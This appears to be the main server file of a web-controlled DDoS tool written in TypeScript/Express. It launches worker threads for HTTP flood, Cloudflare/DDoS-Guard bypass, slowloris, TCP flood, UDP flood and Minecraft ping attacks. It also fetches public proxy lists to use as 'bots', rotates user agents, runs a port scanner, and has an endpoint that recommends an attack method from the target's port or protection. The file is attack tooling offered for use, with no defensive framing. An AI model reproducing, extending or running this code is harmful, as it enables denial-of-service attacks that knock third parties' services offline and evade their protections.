import express from "express";
import { readFileSync, writeFileSync, promises as fsPromises } from "fs";
import { createServer } from "http";
import { dirname, join } from "path";
import { Server } from "socket.io";
import { fileURLToPath } from "url";
import { Worker } from "worker_threads";

import axios from "axios";
import bodyParser from "body-parser";
import { currentPath, loadProxies, loadUserAgents } from "./fileLoader";
import { AttackMethod, METHOD_INFO } from "./lib";
import { filterProxies } from "./proxyUtils";

// Proxy source URLs
const PROXY_SOURCES = [
  { url: "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", protocol: "http" },
  { url: "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt", protocol: "socks4" },
  { url: "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt", protocol: "socks5" },
];

// Define the workers based on attack type
const attackWorkers: { [key in AttackMethod]: string } = {
  http_flood: "./workers/httpFloodAttack.js",
  http_bypass: "./workers/httpBypassAttack.js",
  http_slowloris: "./workers/httpSlowlorisAttack.js",
  tcp_flood: "./workers/tcpFloodAttack.js",
  udp_flood: "./workers/udpFloodAttack.js",
  minecraft_ping: "./workers/minecraftPingAttack.js",
};

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const __prod = process.env.NODE_ENV === "production";

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: __prod ? "" : "http://localhost:5173",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  },
});

let proxies = loadProxies();
const userAgents = loadUserAgents();

console.log("Proxies loaded:", proxies.length);
console.log("User agents loaded:", userAgents.length);

app.use(express.static(join(__dirname, "public")));

io.on("connection", (socket) => {
  console.log("Client connected");

  socket.emit("stats", {
    pps: 0,
    bots: proxies.length,
    totalPackets: 0,
    log: "🍤 Connected to the server.",
  });

  socket.on("startAttack", (params) => {
    const { target, duration, packetDelay, attackMethod, packetSize } = params;
    const filteredProxies = filterProxies(proxies, attackMethod);
    const attackWorkerFile = attackWorkers[attackMethod];

    if (!attackWorkerFile) {
      socket.emit("stats", {
        log: `❌ Unsupported attack type: ${attackMethod}`,
      });
      return;
    }

    socket.emit("stats", {
      log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
      bots: filteredProxies.length,
    });

    const worker = new Worker(join(__dirname, attackWorkerFile), {
      workerData: {
        target,
        proxies: filteredProxies,
        userAgents,
        duration,
        packetDelay,
        packetSize,
      },
    });

    worker.on("message", (message) => socket.emit("stats", message));

    worker.on("error", (error: unknown) => {
      const errorMessage = error instanceof Error ? error.message : String(error);
      console.error(`Worker error: ${errorMessage}`);
      socket.emit("stats", { log: `❌ Worker error: ${errorMessage}` });
    });

    worker.on("exit", (code) => {
      console.log(`Worker exited with code ${code}`);
      socket.emit("attackEnd");
    });

    socket["worker"] = worker;
  });

  socket.on("stopAttack", () => {
    const worker = socket["worker"];
    if (worker) {
      worker.terminate();
      socket.emit("attackEnd");
    }
  });

  socket.on("startPortScan", (params) => {
    const { target, ports } = params;

    socket.emit("stats", {
      log: `🔍 Initializing port scanner for ${target}...`,
    });

    const worker = new Worker(join(__dirname, "./workers/portScanner.js"), {
      workerData: {
        target,
        ports,
      },
    });

    worker.on("message", (message) => socket.emit("scanResult", message));

    worker.on("error", (error: unknown) => {
      const errorMessage = error instanceof Error ? error.message : String(error);
      console.error(`Port scanner error: ${errorMessage}`);
      socket.emit("scanResult", { log: `❌ Scanner error: ${errorMessage}`, type: "error" });
    });

    worker.on("exit", (code) => {
      console.log(`Port scanner exited with code ${code}`);
      socket.emit("scanEnd");
    });

    socket["scanWorker"] = worker;
  });

  socket.on("stopPortScan", () => {
    const worker = socket["scanWorker"];
    if (worker) {
      worker.terminate();
      socket.emit("scanEnd");
    }
  });

  socket.on("disconnect", () => {
    const worker = socket["worker"];
    if (worker) {
      worker.terminate();
    }
    const scanWorker = socket["scanWorker"];
    if (scanWorker) {
      scanWorker.terminate();
    }
    console.log("Client disconnected");
  });
});

app.get("/configuration", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/json");

  const proxiesText = readFileSync(
    join(currentPath(), "data", "proxies.txt"),
    "utf-8"
  );
  const uasText = readFileSync(join(currentPath(), "data", "uas.txt"), "utf-8");

  res.send({
    proxies: btoa(proxiesText),
    uas: btoa(uasText),
  });
});

app.options("/configuration", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.send();
});

app.post("/configuration", bodyParser.json(), (req, res) => {
  res.setHeader("Access-Control-Allow-Methods", "POST");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/text");

  // console.log(req.body)

  // atob and btoa are used to avoid the problems in sending data with // characters, etc.
  const proxiesData = atob(req.body["proxies"]);
  const uas = atob(req.body["uas"]);
  writeFileSync(join(currentPath(), "data", "proxies.txt"), proxiesData, {
    encoding: "utf-8",
  });
  writeFileSync(join(currentPath(), "data", "uas.txt"), uas, {
    encoding: "utf-8",
  });

  // Reload proxies into memory
  proxies = loadProxies();

  res.send("OK");
});

app.options("/update-proxies", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.send();
});

app.post("/update-proxies", async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/json");

  try {
    const allProxies: string[] = [];
    const errors: string[] = [];
    // Basic proxy format validation: IP:port or host:port
    const proxyRegex = /^[\w.-]+:\d+$/;

    for (const source of PROXY_SOURCES) {
      try {
        const response = await axios.get(source.url, { 
          timeout: 30000,
          maxContentLength: 50 * 1024 * 1024, // 50MB limit
        });
        const lines = response.data
          .split("\n")
          .map((line: string) => line.trim())
          .filter((line: string) => line && !line.startsWith("#") && proxyRegex.test(line));

        for (const line of lines) {
          allProxies.push(`${source.protocol}://${line}`);
        }
      } catch (sourceError) {
        errors.push(`Failed to fetch ${source.protocol} proxies`);
        console.error(`Error fetching ${source.protocol} proxies:`, sourceError);
      }
    }

    if (allProxies.length === 0) {
      res.status(500).json({ success: false, error: "Failed to fetch any proxies" });
      return;
    }

    const proxiesContent = allProxies.join("\n");
    await fsPromises.writeFile(join(currentPath(), "data", "proxies.txt"), proxiesContent, {
      encoding: "utf-8",
    });

    // Reload proxies into memory
    proxies = loadProxies();

    res.json({ success: true, count: allProxies.length, warnings: errors.length > 0 ? errors : undefined });
  } catch (error) {
    console.error("Error updating proxies:", error);
    res.status(500).json({ success: false, error: "Failed to update proxies" });
  }
});

// Get method info for recommendations
app.get("/methods", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/json");
  res.json(METHOD_INFO);
});

// Get recommended method based on target
app.options("/recommend-method", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.send();
});

app.post("/recommend-method", bodyParser.json(), (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/json");

  const { target } = req.body;
  
  if (!target) {
    res.status(400).json({ error: "Target is required" });
    return;
  }

  const targetLower = target.toLowerCase();
  let recommended: AttackMethod = "http_flood";
  let reason = "Default recommendation for web targets";

  // Check for Minecraft servers
  if (targetLower.includes(":25565") || targetLower.includes("minecraft")) {
    recommended = "minecraft_ping";
    reason = "Detected Minecraft server (port 25565)";
  }
  // Check for SSH/FTP and other TCP services
  else if (targetLower.includes(":22") || targetLower.includes(":21") || targetLower.includes(":23")) {
    recommended = "tcp_flood";
    reason = "Detected TCP service (SSH/FTP/Telnet)";
  }
  // Check for DNS or gaming servers (UDP)
  else if (targetLower.includes(":53") || targetLower.includes("dns")) {
    recommended = "udp_flood";
    reason = "Detected DNS service (UDP-based)";
  }
  // Check for HTTP/HTTPS websites
  else if (targetLower.startsWith("http://") || targetLower.startsWith("https://")) {
    // Check if it might be protected
    if (targetLower.includes("cloudflare") || targetLower.includes("ddos-guard")) {
      recommended = "http_bypass";
      reason = "Detected potentially protected website";
    } else {
      recommended = "http_flood";
      reason = "Standard HTTP/HTTPS target";
    }
  }
  // Check for custom TCP ports
  else if (/:\d+$/.test(target)) {
    recommended = "tcp_flood";
    reason = "Custom port detected - using TCP flood";
  }

  res.json({
    recommended,
    reason,
    methodInfo: METHOD_INFO[recommended],
  });
});

const PORT = parseInt(process.env.PORT || "3000");
httpServer.listen(PORT, () => {
  if (__prod) {
    console.log(
      `(Production Mode) Client and server is running under http://localhost:${PORT}`
    );
  } else {
    console.log(`Server is running under development port ${PORT}`);
  }
});
